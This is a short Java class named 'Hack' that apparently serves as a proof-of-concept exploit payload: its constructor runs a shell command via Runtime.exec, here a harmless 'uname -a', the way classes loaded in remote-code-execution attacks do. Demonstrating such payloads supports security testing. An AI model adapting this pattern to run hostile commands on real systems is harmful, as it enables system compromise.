import java.io.InputStreamReader;
import java.io.LineNumberReader;

/**
 * javac src/main/java/Hack.java
 */
public class Hack {

    public Hack() {
        String cmd = "echo 'Run `uname -a`' && uname -a";
        try {
            String[] cmdA = {"/bin/sh", "-c", cmd};
            Process process = Runtime.getRuntime().exec(cmdA);
            LineNumberReader br = new LineNumberReader(new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = br.readLine()) != null) {
                System.out.println(line);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
